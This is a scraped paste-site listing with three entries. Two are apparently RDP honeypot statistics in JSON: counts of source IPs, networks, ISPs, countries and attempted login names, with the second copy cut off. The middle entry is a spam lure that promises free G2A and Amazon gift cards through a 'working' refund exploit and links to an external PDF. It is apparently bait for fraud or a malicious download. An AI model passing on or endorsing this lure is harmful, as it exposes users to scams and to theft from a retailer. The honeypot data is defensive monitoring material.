id,title,username,language,date,content
H0WfMMNv,2024-05-25_stats.json,rdp_snitch,JSON,Saturday 25th of May 2024 07:16:09 PM CDT,"{
  ""ip"": {
    ""94.232.46.148"": 6,
    ""193.37.69.140"": 6,
    ""113.200.222.57"": 2,
    ""82.9.240.241"": 122,
    ""38.170.237.45"": 350,
    ""196.206.113.34"": 2,
    ""100.4.180.56"": 244,
    ""89.165.2.25"": 332,
    ""136.24.37.18"": 1222,
    ""12.226.206.131"": 768,
    ""192.210.149.190"": 326,
    ""95.92.172.88"": 784,
    ""177.222.109.58"": 312,
    ""43.153.99.114"": 242,
    ""71.167.89.124"": 698,
    ""72.167.34.126"": 196,
    ""103.130.212.203"": 330,
    ""57.128.195.167"": 178,
    ""154.85.49.240"": 368,
    ""196.92.1.190"": 636,
    ""184.70.84.114"": 168,
    ""43.132.186.70"": 178,
    ""45.5.94.6"": 860,
    ""45.144.226.76"": 84,
    ""135.148.145.186"": 400,
    ""54.37.51.226"": 232,
    ""202.134.162.131"": 198,
    ""196.70.249.123"": 646,
    ""193.112.134.231"": 104,
    ""201.212.3.108"": 224,
    ""12.193.127.18"": 528,
    ""123.58.207.87"": 156,
    ""103.195.31.188"": 250,
    ""61.66.110.143"": 354,
    ""107.172.73.131"": 200,
    ""80.13.106.84"": 206,
    ""104.218.165.34"": 100,
    ""196.92.1.191"": 558,
    ""98.142.244.243"": 240,
    ""80.124.119.50"": 660,
    ""135.148.145.189"": 60,
    ""176.153.15.140"": 208,
    ""23.94.167.52"": 204,
    ""186.67.171.6"": 442,
    ""189.50.40.204"": 402,
    ""200.37.0.238"": 184,
    ""80.153.67.94"": 284,
    ""152.32.183.213"": 54,
    ""193.112.251.135"": 78,
    ""149.202.172.186"": 180,
    ""38.170.237.41"": 108,
    ""51.81.101.219"": 216,
    ""134.195.208.44"": 476,
    ""139.99.194.253"": 196,
    ""91.192.221.234"": 224,
    ""51.79.140.255"": 2,
    ""80.15.116.13"": 198,
    ""51.68.199.76"": 206,
    ""95.136.11.137"": 434,
    ""15.235.187.94"": 168,
    ""104.218.165.55"": 116,
    ""197.216.3.130"": 88,
    ""196.206.61.131"": 4,
    ""194.169.175.32"": 6,
    ""165.154.174.124"": 154,
    ""135.148.145.188"": 322,
    ""196.217.114.195"": 20,
    ""93.159.194.33"": 374,
    ""45.227.254.55"": 8,
    ""194.165.16.78"": 4,
    ""103.56.5.180"": 12,
    ""103.75.186.158"": 2,
    ""207.154.254.130"": 6,
    ""198.235.24.252"": 6,
    ""61.81.115.70"": 4,
    ""87.251.75.64"": 2,
    ""152.42.249.30"": 2,
    ""212.70.149.142"": 8,
    ""45.125.12.148"": 12,
    ""87.251.75.145"": 4,
    ""2.57.149.186"": 8,
    ""123.56.20.194"": 8,
    ""187.157.89.218"": 2,
    ""51.38.161.248"": 152,
    ""194.165.16.11"": 4,
    ""196.206.200.246"": 72,
    ""103.179.184.81"": 6,
    ""152.32.180.98"": 2,
    ""198.235.24.113"": 6,
    ""172.104.160.249"": 8,
    ""36.91.222.100"": 4,
    ""196.206.113.191"": 4,
    ""45.227.254.9"": 6,
    ""64.124.50.139"": 4,
    ""116.140.196.215"": 2,
    ""112.4.139.162"": 2,
    ""194.165.16.72"": 2,
    ""80.14.17.35"": 102,
    ""196.206.206.72"": 2,
    ""84.201.2.2"": 4,
    ""46.243.78.153"": 2,
    ""172.104.43.32"": 6,
    ""205.210.31.185"": 6,
    ""43.136.116.247"": 2,
    ""81.19.135.2"": 6,
    ""196.206.57.181"": 4,
    ""196.206.62.33"": 2,
    ""196.206.52.254"": 2,
    ""196.206.119.166"": 2,
    ""196.206.52.21"": 2,
    ""196.217.117.185"": 2,
    ""41.248.0.27"": 2,
    ""196.217.119.92"": 2,
    ""1.55.55.178"": 2,
    ""45.227.254.49"": 4,
    ""45.144.226.69"": 10,
    ""80.66.66.145"": 2,
    ""196.206.217.151"": 2,
    ""196.206.204.116"": 22,
    ""198.235.24.85"": 6,
    ""46.243.78.132"": 2,
    ""196.206.137.218"": 6
  },
  ""asn"": {
    ""AS212482"": 6,
    ""AS208091"": 12,
    ""AS4837"": 4,
    ""AS5089"": 122,
    ""AS48635"": 458,
    ""AS36903"": 146,
    ""AS701"": 942,
    ""AS39501"": 332,
    ""AS19165"": 1222,
    ""AS7018"": 1296,
    ""AS36352"": 730,
    ""AS2860"": 784,
    ""AS27882"": 312,
    ""AS132203"": 420,
    ""AS398101"": 196,
    ""AS135953"": 330,
    ""AS16276"": 2312,
    ""AS55967"": 368,
    ""AS6713"": 1846,
    ""AS6327"": 168,
    ""AS28419"": 860,
    ""AS213035"": 94,
    ""AS132296"": 198,
    ""AS45090"": 184,
    ""AS7303"": 224,
    ""AS135377"": 582,
    ""AS134612"": 250,
    ""AS4780"": 354,
    ""AS3215"": 506,
    ""AS215415"": 240,
    ""AS15557"": 660,
    ""AS5410"": 208,
    ""AS27651"": 442,
    ""AS28326"": 402,
    ""AS6147"": 184,
    ""AS3320"": 284,
    ""AS35916"": 476,
    ""AS39783"": 224,
    ""AS12353"": 434,
    ""AS11259"": 88,
    ""AS209605"": 6,
    ""AS196838"": 374,
    ""AS267784"": 18,
    ""AS48721"": 10,
    ""AS140599"": 12,
    ""AS135905"": 2,
    ""AS14061"": 8,
    ""AS396982"": 24,
    ""AS4766"": 4,
    ""AS204428"": 8,
    ""AS55933"": 12,
    ""AS208312"": 8,
    ""AS37963"": 8,
    ""AS8151"": 2,
    ""AS135951"": 6,
    ""AS63949"": 14,
    ""AS7713"": 4,
    ""AS6461"": 4,
    ""AS56046"": 2,
    ""AS44066"": 4,
    ""AS44486"": 4,
    ""AS209588"": 6,
    ""AS18403"": 2,
    ""AS51765"": 2
  },
  ""isp"": {
    ""Xhost Internet Solutions LP"": 12,
    ""Xhost Internet Solutions"": 6,
    ""CNC Group CHINA169 Shannxi Province Network"": 2,
    ""Virgin Media Limited"": 122,
    ""Cldin B.V."": 458,
    ""IP ADSL MarocTelecom"": 150,
    ""Verizon Communications"": 244,
    ""NGS-DC"": 332,
    ""Webpass Inc."": 1222,
    ""AT&T Services, Inc."": 1296,
    ""HostPapa"": 730,
    ""NOS COMUNICACOES S.A"": 784,
    ""Telef\u00f3nica Celular de Bolivia S.A."": 312,
    ""Shenzhen Tencent Computer Systems Company Limited"": 426,
    ""Verizon Business"": 698,
    ""GoDaddy.com, LLC"": 196,
    ""P815"": 330,
    ""OVH SAS"": 2096,
    ""Beijing Baidu Netcom Science and Technology Co., Ltd."": 368,
    ""Itissalat Al-MAGHRIB"": 1194,
    ""Shaw Communications Inc."": 168,
    ""Aceville Pte.ltd"": 178,
    ""Se\u00f1al Interactiva, S.A De C.V"": 860,
    ""Des Capital B.V."": 94,
    ""Seven Star Digital Network Private Limited"": 198,
    ""ADSL Maroc telecom"": 648,
    ""Telecom Argentina S.A."": 224,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 366,
    ""PT Atria Teknologi Indonesia"": 250,
    ""NCICNET"": 354,
    ""France Telecom"": 308,
    ""Zenlayer Inc"": 216,
    ""Velcom"": 240,
    ""Societe Francaise Du Radiotelephone - SFR SA"": 660,
    ""BOUYGUES Telecom"": 208,
    ""Entel Chile S.A."": 442,
    ""Total Telecom LTDA-ME"": 402,
    ""Telefonica del Peru S.A.A."": 184,
    ""Deutsche Telekom AG"": 284,
    ""OVH US LLC"": 216,
    ""Spectero"": 476,
    ""Webhuset"": 224,
    ""France Telecom Orange"": 198,
    ""Vodafone Portugal"": 434,
    ""Angola Telecom"": 88,
    ""UAB Host Baltic"": 6,
    ""TRING"": 374,
    ""Flyservers S.A."": 34,
    ""Comfac Corporation"": 12,
    ""Inet software one member company limited"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Google LLC"": 24,
    ""Korea Telecom"": 4,
    ""SS-Net"": 8,
    ""Cloudie Limited"": 12,
    ""Red Byte LLC"": 8,
    ""Hangzhou Alibaba Advertising Co"": 8,
    ""Uninet S.A. de C.V."": 2,
    ""MAVIN"": 6,
    ""Akamai Technologies"": 14,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Zayo Bandwidth"": 4,
    ""China Unicom CHINA169 Network"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""www.accelerated.de"": 4,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 4,
    ""FPT Telecom Company"": 2,
    ""Oy Crea Nova Hosting Solution Ltd"": 2
  },
  ""org"": {
    ""Dmitriy Panchenko"": 6,
    ""XHOSTIS"": 6,
    ""Unknown"": 3878,
    ""Vmcbbuk"": 122,
    ""ServerMania Inc"": 458,
    ""MCI Communications Services, Inc. d/b/a Verizon Business"": 244,
    ""Neda Gostar Saba Data Transfer Company"": 332,
    ""Webpass Inc"": 1222,
    ""ATT SERVICES INC - PEGACM-MD"": 768,
    ""ColoCrossing"": 526,
    ""NOS Comunicacoes S.A."": 784,
    ""Telef\u00f3nica Celular de Bolivia S.A"": 312,
    ""Tencent Cloud Computing"": 242,
    ""Verizon Business"": 698,
    ""GoDaddy.com, LLC"": 196,
    ""OVH Sp. z o. o"": 178,
    ""Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM"": 1194,
    ""Shaw Communications Inc"": 168,
    ""Se\u00f1al Interactiva, S.A De C.V"": 860,
    ""Serverion BV"": 94,
    ""OVH US LLC"": 782,
    ""chen zexin"": 232,
    ""7 STAR Dot Com Pvt. Ltd"": 198,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 184,
    ""Telecom Argentina S.A"": 224,
    ""ATT SERVICES INC- PEG"": 528,
    ""Ucloud Information Technology (hk) Limited"": 156,
    ""New Centry InfoComm Tech. Co., Ltd."": 354,
    ""UCLOUD"": 216,
    ""Ipxo LLC"": 240,
    ""Entel Chile S.A"": 442,
    ""Total Telecom Ltda"": 402,
    ""UniRed Red Interna"": 184,
    ""Deutsche Telekom AG"": 284,
    ""Ucloud Information Technology"": 54,
    ""OVH"": 180,
    ""LEVEL7BR.COM, OTAVIO HENRIQUE"": 216,
    ""CloudCone, LLC"": 476,
    ""OVH Australia PTY LTD"": 196,
    ""Webhuset"": 224,
    ""OVH Singapore PTE. LTD"": 170,
    ""OVH Ltd"": 206,
    ""Vodafone Portugal - Communicacoes Pessoais S.A."": 434,
    ""AngolaTelecomPublic"": 88,
    ""EmanuelHosting LTD"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 154,
    ""UAB Host Baltic"": 18,
    ""Flyservers S.A"": 10,
    ""Comfac Corporation"": 12,
    ""Inet software one member company limited"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Palo Alto Networks, Inc"": 24,
    ""Kornet"": 4,
    ""Xhost Internet Solutions"": 8,
    ""4Media Ltd"": 8,
    ""Cloudie Limited"": 12,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Aliyun Computing Co., LTD"": 8,
    ""Uninet S.A. de C.V."": 2,
    ""Kota Komputer Wendy"": 152,
    ""Mavin Services Management Joint Stock Company"": 6,
    ""UCloud (HK) Holdings Group Limited"": 2,
    ""Linode"": 14,
    ""Telekomunikasi Indonesia"": 4,
    ""Microsoft Corporation"": 4,
    ""China United Network Communications Corporation Limited"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""diva-e Datacenters GmbH"": 4,
    ""Mo's Operations GmbH"": 4,
    ""Alviva Holding Limited"": 6,
    ""Vietnam Internet Network Information Center"": 2
  },
  ""regionName"": {
    ""Perm Krai"": 6,
    ""North Holland"": 804,
    ""Shaanxi"": 2,
    ""England"": 854,
    ""Casablanca-Settat"": 1992,
    ""New York"": 1346,
    ""Tehran"": 332,
    ""California"": 3426,
    ""Lisbon"": 1218,
    ""Santa Cruz Department"": 312,
    ""Arizona"": 196,
    ""Hanoi"": 338,
    ""Mazovia"": 178,
    ""Alberta"": 168,
    ""Central and Western District"": 178,
    ""Coahuila"": 860,
    ""Virginia"": 836,
    ""Hauts-de-France"": 564,
    ""Maharashtra"": 198,
    ""Guangdong"": 182,
    ""Buenos Aires F.D."": 224,
    ""Texas"": 528,
    ""Jakarta"": 254,
    ""Taipei"": 354,
    ""\u00cele-de-France"": 1166,
    ""Auvergne-Rh\u00f4ne-Alpes"": 208,
    ""Santiago Metropolitan"": 442,
    ""Goi\u00e1s"": 402,
    ""Lima Province"": 184,
    ""Saxony"": 284,
    ""West Virginia"": 216,
    ""New South Wales"": 196,
    ""Oslo County"": 224,
    ""Central Singapore"": 178,
    ""Luanda Province"": 88,
    ""Kaunas"": 16,
    ""Durr\u00ebs County"": 374,
    ""Vilnius"": 18,
    ""Metro Manila"": 12,
    ""Hesse"": 20,
    ""Daejeon"": 4,
    ""South West"": 2,
    ""Plovdiv"": 8,
    ""Yau Tsim Mong"": 12,
    ""Lesser Poland"": 8,
    ""Beijing"": 12,
    ""Mexico City"": 2,
    ""Dubai"": 2,
    ""Washington"": 4,
    ""Jiangsu"": 2,
    ""North West"": 6,
    ""B\u1eafc Ninh Province"": 2,
    ""Uusimaa"": 2
  },
  ""country"": {
    ""Russia"": 6,
    ""The Netherlands"": 346,
    ""China"": 198,
    ""United Kingdom"": 854,
    ""Netherlands"": 458,
    ""Morocco"": 1992,
    ""United States"": 6552,
    ""Iran"": 332,
    ""Portugal"": 1218,
    ""Bolivia"": 312,
    ""Vietnam"": 340,
    ""Poland"": 186,
    ""Canada"": 168,
    ""Hong Kong"": 190,
    ""Mexico"": 862,
    ""France"": 1938,
    ""India"": 198,
    ""Argentina"": 224,
    ""Indonesia"": 254,
    ""Taiwan"": 354,
    ""Chile"": 442,
    ""Brazil"": 402,
    ""Peru"": 184,
    ""Germany"": 304,
    ""Australia"": 196,
    ""Norway"": 224,
    ""Singapore"": 186,
    ""Angola"": 88,
    ""Lithuania"": 34,
    ""Albania"": 374,
    ""Philippines"": 12,
    ""South Korea"": 4,
    ""Bulgaria"": 8,
    ""United Arab Emirates"": 2,
    ""Finland"": 2
  },
  ""account"": {
    ""Domain"": 24,
    ""Administr"": 34,
    ""142.93.8.59"": 19196,
    ""Administrator"": 20,
    ""Admin"": 18,
    ""Whatuptime.com"": 18,
    ""hello"": 70,
    ""Test"": 32,
    ""PfqNIiTCO"": 2,
    ""EUOHdq"": 2,
    ""YjJTHz"": 2,
    ""(empty)"": 8,
    ""VyblEKGpQ"": 2,
    ""TsVPCe"": 2,
    ""PrNlMK"": 2,
    ""RzrGLTyOs"": 2,
    ""JXRSDy"": 2,
    ""OwfGgo"": 2,
    ""mXflxwnrd"": 2,
    ""ZEKAhJ"": 2,
    ""AqXnbJ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 19444
  },
  ""client_build"": {
    ""Unknown"": 19444
  },
  ""client_name"": {
    ""Unknown"": 19444
  },
  ""ip_type"": {
    ""proxy"": 14,
    ""Unknown"": 12954,
    ""hosting & proxy"": 472,
    ""hosting"": 5594,
    ""mobile"": 410
  }
}"
Wvc279zA,💸G2A.com Free Gift Card Guide May 2024🔥,buch,GetText,Saturday 25th of May 2024 07:15:54 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_6717269.pdf

Working as of:

26 May 2024"
izCKH3Rd,2024-05-25_stats.json,rdp_snitch,JSON,Saturday 25th of May 2024 07:15:10 PM CDT,"{
  ""ip"": {
    ""94.232.46.148"": 3,
    ""193.37.69.140"": 3,
    ""113.200.222.57"": 1,
    ""82.9.240.241"": 61,
    ""38.170.237.45"": 175,
    ""196.206.113.34"": 1,
    ""100.4.180.56"": 122,
    ""89.165.2.25"": 166,
    ""136.24.37.18"": 611,
    ""12.226.206.131"": 384,
    ""192.210.149.190"": 163,
    ""95.92.172.88"": 392,
    ""177.222.109.58"": 156,
    ""43.153.99.114"": 121,
    ""71.167.89.124"": 349,
    ""72.167.34.126"": 98,
    ""103.130.212.203"": 165,
    ""57.128.195.167"": 89,
    ""154.85.49.240"": 184,
    ""196.92.1.190"": 318,
    ""184.70.84.114"": 84,
    ""43.132.186.70"": 89,
    ""45.5.94.6"": 430,
    ""45.144.226.76"": 42,
    ""135.148.145.186"": 200,
    ""54.37.51.226"": 116,
    ""202.134.162.131"": 99,
    ""196.70.249.123"": 323,
    ""193.112.134.231"": 52,
    ""201.212.3.108"": 112,
    ""12.193.127.18"": 264,
    ""123.58.207.87"": 78,
    ""103.195.31.188"": 125,
    ""61.66.110.143"": 177,
    ""107.172.73.131"": 100,
    ""80.13.106.84"": 103,
    ""104.218.165.34"": 50,
    ""196.92.1.191"": 279,
    ""98.142.244.243"": 120,
    ""80.124.119.50"": 330,
    ""135.148.145.189"": 30,
    ""176.153.15.140"": 104,
    ""23.94.167.52"": 102,
    ""186.67.171.6"": 221,
    ""189.50.40.204"": 201,
    ""200.37.0.238"": 92,
    ""80.153.67.94"": 142,
    ""152.32.183.213"": 27,
    ""193.112.251.135"": 39,
    ""149.202.172.186"": 90,
    ""38.170.237.41"": 54,
    ""51.81.101.219"": 108,
    ""134.195.208.44"": 238,
    ""139.99.194.253"": 98,
    ""91.192.221.234"": 112,
    ""51.79.140.255"": 1,
    ""80.15.116.13"": 99,
    ""51.68.199.76"": 103,
    ""95.136.11.137"": 217,
    ""15.235.187.94"": 84,
    ""104.218.165.55"": 58,
    ""197.216.3.130"": 44,
    ""196.206.61.131"": 2,
    ""194.169.175.32"": 3,
    ""165.154.174.124"": 77,
    ""135.148.145.188"": 161,
    ""196.217.114.195"": 10,
    ""93.159.194.33"": 187,
    ""45.227.254.55"": 4,
    ""194.165.16.78"": 2,
    ""103.56.5.180"": 6,
    ""103.75.186.158"": 1,
    ""207.154.254.130"": 3,
    ""198.235.24.252"": 3,
    ""61.81.115.70"": 2,
    ""87.251.75.64"": 1,
    ""152.42.249.30"": 1,
    ""212.70.149.142"": 4,
    ""45.125.12.148"": 6,
    ""87.251.75.145"": 2,
    ""2.57.149.186"": 4,
    ""123.56.20.194"": 4,
    ""187.157.89.218"": 1,
    ""51.38.161.248"": 76,
    ""194.165.16.11"": 2,
    ""196.206.200.246"": 36,
    ""103.179.184.81"": 3,
    ""152.32.180.98"": 1,
    ""198.235.24.113"": 3,
    ""172.104.160.249"": 4,
    ""36.91.222.100"": 2,
    ""196.206.113.191"": 2,
    ""45.227.254.9"": 3,
    ""64.124.50.139"": 2,
    ""116.140.196.215"": 1,
    ""112.4.139.162"": 1,
    ""194.165.16.72"": 1,
    ""80.14.17.35"": 51,
    ""196.206.206.72"": 1,
    ""84.201.2.2"": 2,
    ""46.243.78.153"": 1,
    ""172.104.43.32"": 3,
    ""205.210.31.185"": 3,
    ""43.136.116.247"": 1,
    ""81.19.135.2"": 3,
    ""196.206.57.181"": 2,
    ""196.206.62.33"": 1,
    ""196.206.52.254"": 1,
    ""196.206.119.166"": 1,
    ""196.206.52.21"": 1,
    ""196.217.117.185"": 1,
    ""41.248.0.27"": 1,
    ""196.217.119.92"": 1,
    ""1.55.55.178"": 1,
    ""45.227.254.49"": 2,
    ""45.144.226.69"": 5,
    ""80.66.66.145"": 1,
    ""196.206.217.151"": 1,
    ""196.206.204.116"": 11,
    ""198.235.24.85"": 3,
    ""46.243.78.132"": 1,
    ""196.206.137.218"": 3
  },
  ""asn"": {
    ""AS212482"": 3,
    ""AS208091"": 6,
    ""AS4837"": 2,
    ""AS5089"": 61,
    ""AS48635"": 229,
    ""AS36903"": 73,
    ""AS701"": 471,
    ""AS39501"": 166,
    ""AS19165"": 611,
    ""AS7018"": 648,
    ""AS36352"": 365,
    ""AS2860"": 392,
    ""AS27882"": 156,
    ""AS132203"": 210,
    ""AS398101"": 98,
    ""AS135953"": 165,
    ""AS16276"": 1156,
    ""AS55967"": 184,
    ""AS6713"": 923,
    ""AS6327"": 84,
    ""AS28419"": 430,
    ""AS213035"": 47,
    ""AS132296"": 99,
    ""AS45090"": 92,
    ""AS7303"": 112,
    ""AS135377"": 291,
    ""AS134612"": 125,
    ""AS4780"": 177,
    ""AS3215"": 253,
    ""AS215415"": 120,
    ""AS15557"": 330,
    ""AS5410"": 104,
    ""AS27651"": 221,
    ""AS28326"": 201,
    ""AS6147"": 92,
    ""AS3320"": 142,
    ""AS35916"": 238,
    ""AS39783"": 112,
    ""AS12353"": 217,
    ""AS11259"": 44,
    ""AS209605"": 3,
    ""AS196838"": 187,
    ""AS267784"": 9,
    ""AS48721"": 5,
    ""AS140599"": 6,
    ""AS135905"": 1,
    ""AS14061"": 4,
    ""AS396982"": 12,
    ""AS4766"": 2,
    ""AS204428"": 4,
    ""AS55933"": 6,
    ""AS208312"": 4,
    ""AS37963"": 4,
    ""AS8151"": 1,
    ""AS135951"": 3,
    ""AS63949"": 7,
    ""AS7713"": 2,
    ""AS6461"": 2,
    ""AS56046"": 1,
    ""AS44066"": 2,
    ""AS44486"": 2,
    ""AS209588"": 3,
    ""AS18403"": 1,
    ""AS51765"": 1
  },
  ""isp"": {
    ""Xhost Internet Solutions LP"": 6,
    ""Xhost Internet Solutions"": 3,
    ""CNC Group CHINA169 Shannxi Province Network"": 1,
    ""Virgin Media Limited"": 61,
    ""Cldin B.V."": 229,
    ""IP ADSL MarocTelecom"": 75,
    ""Verizon Communications"": 122,
    ""NGS-DC"": 166,
    ""Webpass Inc."": 611,
    ""AT&T Services, Inc."": 648,
    ""HostPapa"": 365,
    ""NOS COMUNICACOES S.A"": 392,
    ""Telef\u00f3nica Celular de Bolivia S.A."": 156,
    ""Shenzhen Tencent Computer Systems Company Limited"": 213,
    ""Verizon Business"": 349,
    ""GoDaddy.com, LLC"": 98,
    ""P815"": 165,
    ""OVH SAS"": 1048,
    ""Beijing Baidu Netcom Science and Technology Co., Ltd."": 184,
    ""Itissalat Al-MAGHRIB"": 597,
    ""Shaw Communications Inc."": 84,
    ""Aceville Pte.ltd"": 89,
    ""Se\u00f1al Interactiva, S.A De C.V"": 430,
    ""Des Capital B.V."": 47,
    ""Seven Star Digital Network Private Limited"": 99,
    ""ADSL Maroc telecom"": 324,
    ""Telecom Argentina S.A."": 112,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 183,
    ""PT Atria Teknologi Indonesia"": 125,
    ""NCICNET"": 177,
    ""France Telecom"": 154,
    ""Zenlayer Inc"": 108,
    ""Velcom"": 120,
    ""Societe Francaise Du Radiotelephone - SFR SA"": 330,
    ""BOUYGUES Telecom"": 104,
    ""Entel Chile S.A."": 221,
    ""Total Telecom LTDA-ME"": 201,
    ""Telefonica del Peru S.A.A."": 92,
    ""Deutsche Telekom AG"": 142,
    ""OVH US LLC"": 108,
    ""Spectero"": 238,
    ""Webhuset"": 112,
    ""France Telecom Orange"": 99,
    ""Vodafone Portugal"": 217,
    ""Angola Telecom"": 44,
    ""UAB Host Baltic"": 3,
    ""TRING"": 187,
    ""Flyservers S.A."": 17,
    ""Comfac Corporation"": 6,
    ""Inet software one member company limited"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Google LLC"": 12,
    ""Korea Telecom"": 2,
    ""SS-Net"": 4,
    ""Cloudie Limited"": 6,
    ""Red Byte LLC"": 4,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""Uninet S.A. de C.V."": 1,
    ""MAVIN"": 3,
    ""Akamai Technologies"": 7,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Zayo Bandwidth"": 2,
    ""China Unicom CHINA169 Network"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""www.accelerated.de"": 2,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 2,
    ""FPT Telecom Company"": 1,
    ""Oy Crea Nova Hosting Solution Ltd"": 1
  },
  ""org"": {
    ""Dmitriy Panchenko"": 3,
    ""XHOSTIS"": 3,
    ""Unknown"": 1939,
    ""Vmcbbuk"": 61,
    ""ServerMania Inc"": 229,
    ""MCI Communications Services, Inc. d/b/a Verizon Business"": 122,
    ""Neda Gostar Saba Data Transfer Company"": 166,
    ""Webpass Inc"": 611,
    ""ATT SERVICES INC - PEGACM-MD"": 384,
    ""ColoCrossing"": 263,
    ""NOS Comunicacoes S.A."": 392,
    ""Telef\u00f3nica Celular de Bolivia S.A"": 156,
    ""Tencent Cloud Computing"": 121,
    ""Verizon Business"": 349,
    ""GoDaddy.com, LLC"": 98,
    ""OVH Sp. z o. o"": 89,
    ""Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM"": 597,
    ""Shaw Communications Inc"": 84,
    ""Se\u00f1al Interactiva, S.A De C.V"": 430,
    ""Serverion BV"": 47,
    ""OVH US LLC"": 391,
    ""chen zexin"": 116,
    ""7 STAR Dot Com Pvt. Ltd"": 99,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 92,
    ""Telecom Argentina S.A"": 112,
    ""ATT SERVICES INC- PEG"": 264,
    ""Ucloud Information Technology (hk) Limited"": 78,
    ""New Centry InfoComm Tech. Co., Ltd."": 177,
    ""UCLOUD"": 108,
    ""Ipxo LLC"": 120,
    ""Entel Chile S.A"": 221,
    ""Total Telecom Ltda"": 201,
    ""UniRed Red Interna"": 92,
    ""Deutsche Telekom AG"": 142,
    ""Ucloud Information Technology"": 27,
    ""OVH"": 90,
    ""LEVEL7BR.COM, OTAVIO HENRIQUE"": 108,
    ""CloudCone, LLC"": 238,
    ""OVH Australia PTY LTD"": 98,
    ""Webhuset"": 112,
    ""OVH Singapore PTE. LTD"": 85,
    ""OVH Ltd"": 103,
    ""Vodafone Portugal - Communicacoes Pessoais S.A."": 217,
    ""AngolaTelecomPublic"": 44,
    ""EmanuelHosting LTD"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 77,
    ""UAB Host Baltic"": 9,
    ""Flyservers S.A"": 5,
    ""Comfac Corporation"": 6,
    ""Inet software one member company limited"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""Kornet"": 2,
    ""Xhost Internet Solutions"": 4,
    ""4Media Ltd"": 4,
    ""Cloudie Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Aliyun Computing Co., LTD"": 4,
    ""Uninet S.A. de C.V."": 1,
    ""Kota Komputer Wendy"": 76,
    ""Mavin Services Management Joint Stock Company"": 3,
    ""UCloud (HK) Holdings Group Limited"": 1,
    ""Linode"": 7,
    ""Telekomunikasi Indonesia"": 2,
    ""Microsoft Corporation"": 2,
    ""China United Network Communications Corporation Limited"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""diva-e Datacenters GmbH"": 2,
    ""Mo's Operations GmbH"": 2,
    ""Alviva Holding Limited"": 3,
    ""Vietnam Internet Network Information Center"": 1
  },
  ""regionName"": {
    ""Perm Krai"": 3,
    ""North Holland"": 402,
    ""Shaanxi"": 1,
    ""England"": 427,
    ""Casablanca-Settat"": 996,
    ""New York"": 673,
    ""Tehran"": 166,
    ""California"": 1713,
    ""Lisbon"": 609,
    ""Santa Cruz Department"": 156,
    ""Arizona"": 98,
    ""Hanoi"": 169,
    ""Mazovia"": 89,
    ""Alberta"": 84,
    ""Central and Western District"": 89,
    ""Coahuila"": 430,
    ""Virginia"": 418,
    ""Hauts-de-France"": 282,
    ""Maharashtra"": 99,
    ""Guangdong"": 91,
    ""Buenos Aires F.D."": 112,
    ""Texas"": 264,
    ""Jakarta"": 127,
    ""Taipei"": 177,
    ""\u00cele-de-France"": 583,
    ""Auvergne-Rh\u00f4ne-Alpes"": 104,
    ""Santiago Metropolitan"": 221,
    ""Goi\u00e1s"": 201,
    ""Lima Province"": 92,
    ""Saxony"": 142,
    ""West Virginia"": 108,
    ""New South Wales"": 98,
    ""Oslo County"": 112,
    ""Central Singapore"": 89,
    ""Luanda Province"": 44,
    ""Kaunas"": 8,
    ""Durr\u00ebs County"": 187,
    ""Vilnius"": 9,
    ""Metro Manila"": 6,
    ""Hesse"": 10,
    ""Daejeon"": 2,
    ""South West"": 1,
    ""Plovdiv"": 4,
    ""Yau Tsim Mong"": 6,
    ""Lesser Poland"": 4,
    ""Beijing"": 6,
    ""Mexico City"": 1,
    ""Dubai"": 1,
    ""Washington"": 2,
    ""Jiangsu"": 1,
    ""North West"": 3,
    ""B\u1eafc Ninh Province"": 1,
    ""Uusimaa"": 1
  },
  ""country"": {
    ""Russia"": 3,
    ""The Netherlands"": 173,
    ""China"": 99,
    ""United Kingdom"": 427,
    ""Netherlands"": 229,
    ""Morocco"": 996,
    ""United States"": 3276,
    ""Iran"": 166,
    ""Portugal"": 609,
    ""Bolivia"": 156,
    ""Vietnam"": 170,
    ""Poland"": 93,
    ""Canada"": 84,
    ""Hong Kong"": 95,
    ""Mexico"": 431,
    ""France"": 969,
    ""India"": 99,
    ""Argentina"": 112,
    ""Indonesia"": 127,
    ""Taiwan"": 177,
    ""Chile"": 221,
    ""Brazil"": 201,
    ""Peru"": 92,
    ""Germany"": 152,
    ""Australia"": 98,
    ""Norway"": 112,
    ""Singapore"": 93,
    ""Angola"": 44,
    ""Lithuania"": 17,
    ""Albania"": 187,
    ""Philippines"": 6,
    ""South Korea"": 2,
    ""Bulgaria"": 4,
    ""United Arab Emirates"": 1,
    ""Finland"": 1
  },
  ""account"": {
    ""Domain"": 12,
    ""Administr"": 17,
    ""142.93.8.59"": 9598,
    ""Administrator"": 10,
    ""Admin"": 9,
    ""Whatuptime.com"": 9,
    ""hello"": 35,
    ""Test"": 16,
    ""PfqNIiTCO"": 1,
    ""EUOHdq"": 1,
    ""YjJTHz"": 1,
    ""(empty)"": 4,
    ""VyblEKGpQ"": 1,
    ""TsVPCe"": 1,
    ""PrNlMK"": 1,
    ""RzrGLTyOs"": 1,
    ""JXRSDy"": 1,
